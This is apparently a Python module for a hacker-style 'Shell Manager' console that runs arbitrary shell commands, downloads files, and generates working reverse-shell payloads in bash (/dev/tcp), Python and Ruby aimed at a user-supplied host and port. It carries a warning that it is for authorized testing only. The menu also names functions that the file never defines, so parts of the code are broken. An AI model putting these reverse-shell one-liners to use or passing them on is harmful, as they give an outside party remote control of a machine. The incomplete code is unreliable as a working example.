# Shell operations advanced module

import os
import sys
import subprocess
import platform
import threading
import time
from pathlib import Path

from core.display import get_inpt, Colors, Colorate, Theme
from core.paginated_ui import PaginatedUI

class ShellManager:
    def __init__(self):
        self.theme = Theme.get_colors()
        self.temp_commands = []
        self.running = True
        
    def _draw_header(self):
        print()
        print(Colorate.Horizontal(self.theme["head"], "=" * 80))
        print(Colorate.Horizontal(self.theme["head"], " SHELL MANAGER - Advanced Command Line Operations "))
        print(Colorate.Horizontal(self.theme["head"], "=" * 80))
        
    def _display_prompt(self):
        host = platform.node() or "unknown"
        cwd = Path.cwd().name
        print(Colorate.Horizontal(self.theme["txt"], f"  [{Colors.color.BLUE}navi@shell:{Colors.color.RESET} {host}]~{Colors.color.YELLOW}{cwd}{Colors.color.RESET}:$ "), end="")
        
    def _run_command(self, cmd, output_file=None):
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                cwd=os.getcwd()
            )
            
            output_lines = []
            while True:
                output = process.stdout.readline()
                if output:
                    output_lines.append(output)
                    print(output, end="", flush=True)
                if process.poll() is not None:
                    break
                    
            stdout, stderr = process.communicate()
            
            if output_file:
                with open(output_file, 'w') as f:
                    f.write("".join(output_lines) + stdout + ("\n" + stderr if stderr else ""))
                    
            return process.returncode
            
        except Exception as e:
            print(f"Error executing command: {e}")
            return 1
            
    def _history_menu(self):
        print()
        print(Colorate.Horizontal(self.theme["head"], "  COMMAND HISTORY "))
        print(Colorate.Horizontal(self.theme["head"], "-" * 40))
        
        if not self.temp_commands:
            print(Colorate.Horizontal(self.theme["txt"], "  No commands in history."))
        else:
            for i, cmd in enumerate(reversed(self.temp_commands[-10:])):
                print(Colorate.Horizontal(self.theme["num"], f"  [{len(self.temp_commands) - i}] "), end="")
                print(Colorate.Horizontal(self.theme["txt"], cmd))
                
        input(f"\n{self.theme['head']}[+] Press Enter to continue...")
        
    def _download_manager(self):
        print()
        print(Colorate.Horizontal(self.theme["head"], "  ADVANCED DOWNLOAD MANAGER "))
        print(Colorate.Horizontal(self.theme["head"], "-" * 40))
        
        url = get_inpt(f"  {Colors.color.CYAN}URL{Colors.color.RESET}: ")
        path = get_inpt(f"  {Colors.color.CYAN}Output Path (leave blank for auto):{Colors.color.RESET} ")
        
        if not url:
            print(Colorate.Horizontal(self.theme["num"], "  [!] No URL provided."))
            return
            
        self.temp_commands.append(f"wget -O {path or 'download.bin'} {url}")
        
        print(Colorate.Horizontal(self.theme["head"], f"  [-] Downloading {url}..."))
        try:
            if platform.system() == "Windows":
                subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri '{url}' -OutFile '{path or 'download.bin'}'"], check=True)
            else:
                subprocess.run(["wget", "-O", path or "download.bin", url], check=True)
            print(Colorate.Horizontal(self.theme["head"], "  [+] Download complete!"))
        except Exception as e:
            print(Colorate.Horizontal(self.theme["num"], f"  [!] Download failed: {e}"))
            
        input(f"\n{self.theme['head']}[+] Press Enter to continue...")
        
    def _reverse_shell(self):
        print()
        print(Colorate.Horizontal(self.theme["head"], "  REVERSE SHELL UTILITY "))
        print(Colorate.Horizontal(self.theme["head"], "-" * 40))
        
        print(Colorate.Horizontal(self.theme["txt"], "  WARNING: This tool is for authorized penetration testing ONLY!"))
        print(Colorate.Horizontal(self.theme["txt"], "  Do not use on systems you do not own or have explicit permission to test."))
        print()
        
        confirm = get_inpt(f"  {Colors.color.RED}Generate reverse shell? (y/n):{Colors.color.RESET} ")
        
        if confirm.lower() != "y":
            return
            
        lang = get_inpt(f"  {Colors.color.CYAN}Payload language (bash/python/ruby):{Colors.color.RESET} ")
        lhost = get_inpt(f"  {Colors.color.CYAN}Local host IP:{Colors.color.RESET} ")
        lport = get_inpt(f"  {Colors.color.CYAN}Local port:{Colors.color.RESET} ")
        
        reverse_shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
            "ruby": f"ruby -e 'require \"socket\";s=TCPSocket.new(\"{lhost}\",{lport});while cmd=s.gets;open(\"/dev/tty\",\"w\").write(cmd);PID=IO.popen(cmd,\"r\"){{|io|io.read}} ;s.print(PID + \"\\n\" );end;s.close'",
        }
        
        if lang in reverse_shells:
            payload = reverse_shells[lang]
            print()
            print(Colorate.Horizontal(self.theme["head"], "  PAYLOAD (copy this to attacker):"))
            print(Colorate.Horizontal(self.theme["num"], f"  {payload}"))
        else:
            print(Colorate.Horizontal(self.theme["num"], "  [!] Unsupported language."))
            
        print(Colorate.Horizontal(self.theme["head"], "  [+] Payload generated!"))
        input(f"\n{self.theme['head']}[+] Press Enter to continue...")
        
    def run(self):
        self._draw_header()
        
        print(Colorate.Horizontal(self.theme["txt"], "  Navigation Keys:", Colors.color.BLUE))
        print(Colorate.Horizontal(self.theme["txt"], "    TAB    - Complete current command"))
        print(Colorate.Horizontal(self.theme["txt"], "    Ctrl+C - Clear input line"))
        print(Colorate.Horizontal(self.theme["txt"], "    Ctrl+E - End of line"))
        print(Colorate.Horizontal(self.theme["txt"], "    Ctrl+U - Clear line"))
        print(Colorate.Horizontal(self.theme["txt"], "    Ctrl+L - Clear screen"))
        print(Colorate.Horizontal(self.theme["txt"], "  Commands:", Colors.color.YELLOW))
        print(Colorate.Horizontal(self.theme["txt"], "    [r]   - Show command history"))
        print(Colorate.Horizontal(self.theme["txt"], "    [i]   - Create IP geolocation report"))
        print(Colorate.Horizontal(self.theme["txt"], "    [d]   - Download manager"))
        print(Colorate.Horizontal(self.theme["txt"], "    [rev] - Generate reverse shell"))
        print(Colorate.Horizontal(self.theme["txt"], "    [exec]- Execute saved payload"))
        print(Colorate.Horizontal(self.theme["txt"], "    [/]   - Save current directory state"))
        print(Colorate.Horizontal(self.theme["txt"], "    [cd]  - Detailed directory explorer"))
        print()
        
        if platform.system() == "Linux":
            print(Colorate.Horizontal(self.theme["head"], "  [+] Root access available: "), end="")
            print(Colorate.Horizontal(self.theme["txt"], "yes" if os.geteuid() == 0 else "no"))
        
        while self.running:
            try:
                self._display_prompt()
                cmd = input("")
                
                if cmd.lower() == "exit":
                    break
                    
                cmd_lower = cmd.lower()
                
                if cmd_lower == "r":
                    self._history_menu()
                    continue
                elif cmd_lower == "cd":
                    self._detailed_cd()
                    continue
                elif cmd_lower == "i":
                    self._create_ip_report()
                    continue
                elif cmd_lower == "d":
                    self._download_manager()
                    continue
                elif cmd_lower == "rev":
                    self._reverse_shell()
                    continue
                    
                self.temp_commands.append(cmd)
                self._run_command(cmd)
                
            except KeyboardInterrupt:
                print(Colorate.Horizontal(self.theme["num"], "\n  [!] Interrupted by user"))
            except Exception as e:
                print(f"\n{Colorate.Horizontal(self.theme['num'], f' [!] Error: {e}')}")
                
        print(Colorate.Horizontal(self.theme["head"], "  [+] Shell manager exited."))

if __name__ == "__main__":
    try:
        ShellManager().run()
    except Exception as e:
        print(Colorate.Horizontal(Colors.color.RED, f"\n  [!] Fatal error: {e}"))
        input("Press Enter to continue...")
